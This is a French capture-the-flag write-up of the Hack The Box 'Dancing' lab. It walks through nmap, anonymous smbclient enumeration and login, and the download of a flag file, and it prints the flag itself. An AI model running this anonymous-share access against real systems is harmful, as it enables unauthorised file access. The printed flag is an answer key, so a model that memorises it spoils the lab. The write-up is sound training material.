---
title: Starting Point Dancing - Hack the Box 
date: 2025-02-25
tags: [HackTheBox, SMB, VeryEasy]
categories: writeups
keywords: 'SMB Hack the box'
description: Box Starting Point - Hack The Box 
cover: images/writeups/Dancing/image.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: true
---

#### Introduction
Le **protocole SMB (Server Message Block)** est un **protocole de communication client-serveur** principalement utilisé pour le **partage de fichiers** et d'autres ressources sur un réseau. Il permet aux applications de lire et d'écrire dans des fichiers et de demander des services auprès de programmes serveurs, notamment sur des systèmes d'exploitation Windows. SMB est aussi utilisé pour accéder à des ressources partagées comme des **systèmes de fichiers**, **imprimantes**, **ports série**, et plus encore.

#### Vue d'ensemble du protocole SMB
Le protocole SMB permet de **partager des fichiers** entre des machines, ce qui le rend utile pour accéder à des fichiers et répertoires sur des ordinateurs connectés en réseau. Il fonctionne principalement sur le **port TCP 445** pour la communication sécurisée. Les anciennes versions de SMB (comme SMBv1) pouvaient également utiliser le port 139.

### Résultats du scan Nmap
Pour commencer, un scan **Nmap** a été effectué sur le **port 445** de l'adresse IP cible **10.129.41.30** afin de détecter la disponibilité du service SMB.

```bash
┌──(jolan㉿jolan)-[~]
└─$ nmap -p 445 -Pn -sV 10.129.41.30
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 09:39 CET
Nmap scan report for 10.129.41.30
Host is up.

PORT    STATE    SERVICE      VERSION
445/tcp filtered microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds
```

Le résultat montre que le port **445** est **filtré**, ce qui signifie que le service SMB est probablement présent, mais il est peut-être protégé par un pare-feu ou d'autres mesures de sécurité.

### Liste des Partages SMB Disponibles
Ensuite, l'outil **smbclient** a été utilisé pour lister les partages disponibles sur la machine cible **10.129.41.30**.

```bash
┌──(jolan㉿jolan)-[~]
└─$ smbclient -L 10.129.41.30
Password for [WORKGROUP\jolan]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.41.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Plusieurs partages SMB sont disponibles :

- **ADMIN$** : Partage administratif, généralement utilisé pour l'administration à distance.
- **C$** : Partage par défaut du disque C:.
- **IPC$** : Partage de communication inter-processus utilisé pour la communication entre processus.
- **WorkShares** : Partage défini par l'utilisateur.

### Connexion aux Partages SMB
Pour accéder au partage **WorkShares**, la commande suivante a été utilisée avec un mot de passe vide (`-N`), ce qui signifie une connexion sans mot de passe :

```bash
smbclient //10.129.41.30/WorkShares -N
```

Cela a permis de se connecter avec succès au partage sans nécessiter de mot de passe.

### Navigation dans le Répertoire WorkShares
Une fois dans le répertoire **WorkShares**, la commande `ls` a été utilisée pour lister le contenu :

```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

                5114111 blocks of size 4096. 1753896 blocks available
```

Le répertoire **James.P** a été trouvé, et après y être allé, le fichier suivant a été découvert :

```bash
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

                5114111 blocks of size 4096. 1753896 blocks available
```

Le fichier **flag.txt** semble contenir un indice ou un drapeau.

### Téléchargement du Flag
La commande `get` a été utilisée pour télécharger le fichier **flag.txt** sur la machine locale :

```bash
smb: \James.P\> get flag.txt /home/jolan/Bureau/flag.txt
getting file \James.P\flag.txt of size 32 as /home/jolan/Bureau/flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Le fichier **flag.txt** a été téléchargé avec succès, et son contenu a été récupéré.

#### Contenu du Flag
Le contenu du **flag.txt** est :

```
5f61c10dffbc77a704d76016a22f1664
```

### Conclusion
Grâce à l'utilisation des outils **Nmap**, **smbclient** et de la navigation dans les répertoires, le protocole SMB a été exploité pour accéder aux ressources partagées, et un flag a été récupéré dans le répertoire **James.P**. Cela met en évidence l'importance de sécuriser les partages SMB pour éviter tout accès non autorisé aux ressources sensibles.